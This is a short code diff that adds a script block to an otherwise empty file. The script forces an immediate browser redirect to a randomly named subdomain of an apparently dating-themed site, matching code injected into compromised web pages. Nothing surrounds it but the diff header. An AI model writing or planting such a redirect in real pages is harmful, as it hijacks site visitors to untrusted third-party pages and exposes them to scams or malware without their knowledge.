@@ -1,1 +1,8 @@
-
+<script>
+var pagina="https://x3gp2r1.idolmeetconnect.com/gqfrx76"
+function redireccionar()
+{
+location.href=pagina
+}
+setTimeout ("redireccionar()", 0);
+</script>
